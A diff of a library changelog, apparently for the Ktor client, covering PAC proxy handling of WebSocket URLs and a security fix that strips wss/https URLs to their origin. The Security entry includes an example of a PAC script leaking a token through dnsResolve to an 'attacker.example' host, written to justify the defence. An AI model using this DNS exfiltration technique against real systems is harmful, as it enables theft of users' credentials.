@@ -495,10 +495,13 @@ The format is based on [Keep a Changelog 1.1.0](https://keepachangelog.com/en/1.
   (`…Ex` included) in a context without network, file or timer APIs, each run limited to 2 seconds from its start and
   its DNS lookups within that (threat model 3.20.3). An answer naming only proxies the engine cannot use (`HTTPS`,
   `SOCKS4`) fails closed: the next setting, else the request fails, never a direct connection. A WPAD discovery that
-  finds no script is logged once at Info. A WebSocket's lookup passes its `ws://`/`wss://` URI with the resource name (RFC 6455 section
-  4.1); on the JVM and Android `ProxySelector.select` gets it too (`ws` as `http`, `wss` as `https`, the schemes
-  selectors know), though Android's PAC selector keeps it for `http` URIs only and the JDK's passes only the scheme and
-  host to the OS. A lookup waits for the script at most 5 seconds (on Windows a WinHTTP call still running then, which
+  finds no script is logged once at Info. The script gets the URL as Chrome builds it: a `ws://` URI whole, with its
+  resource name (RFC 6455 section 4.1), and `wss`, `https` and `http` as their origin only (`wss://host[:port]/`; see
+  Security); on the JVM and Android `ProxySelector.select` gets a WebSocket's resource name (`ws` as `http`, `wss` as
+  `https`, the schemes selectors know), though Android's PAC selector keeps it for `http` URIs only and the JDK's
+  passes only the scheme and host to the OS. On Apple platforms a run resolves at most 20 distinct names, an answer is
+  at most 64 KiB of ASCII, an answer entry that breaks the grammar is skipped (none left: the script failed), and a
+  script given inline has the 1 MiB cap too. A lookup waits for the script at most 5 seconds (on Windows a WinHTTP call still running then, which
   cannot be cancelled, ends on its own thread and its answer is dropped); a script that cannot be fetched or run in
   that time gives the next setting (on Windows the fixed proxy), else a direct connection, with one warning. On
   Windows a WPAD detection that finds no script is logged once at Info (automatic detection is on by default there)
@@ -1421,6 +1424,17 @@ QUIC loss recovery and congestion control (RFC 9002 review):
   as the char of the same code (ISO-8859-1); a value that is valid UTF-8 is decoded as UTF-8 as before.
 
 ### Security
+
+- Ktor client, proxy auto-configuration: a PAC script gets a `wss://` (and `https://`) URL as its origin only,
+  `wss://host[:port]/`, on Apple platforms and Windows. A script found by WPAD, or fetched from a plain-`http` PAC URL,
+  is code from the local network, and it can send what it is given out through `dnsResolve("<data>.attacker.example")`:
+  a token in a WebSocket's path or query would leak (the class of CVE-2016-3763 in Android and CVE-2016-5134 in Chrome,
+  which strip the same way since 2016; Firefox strips the path of every URL). This departs from RFC 6455 section 4.1,
+  whose PAC rule asks for the resource name (an owner-approved security deviation; `ws://` URIs still reach the script
+  whole). `engine { pacFullWebSocketUrl = true }` (*experimental*) gives the whole `wss` URI to the script the system
+  settings name (its URL or the script itself), never to one WPAD found
+  ([Proxies](docs/guide/ktor.md#proxies), [RFC 6455 §4.1](docs/spec/rfc/6455.md#s4-1-connecting-through-a-proxy)).
+  The development builds before this passed every script the whole `wss` URI.
 
 - JVM: the native library extraction (`KslLoader`) no longer creates anything under the umask or an inherited ACL
   (CodeQL `java/local-temp-file-or-directory-information-disclosure`). The library was written through
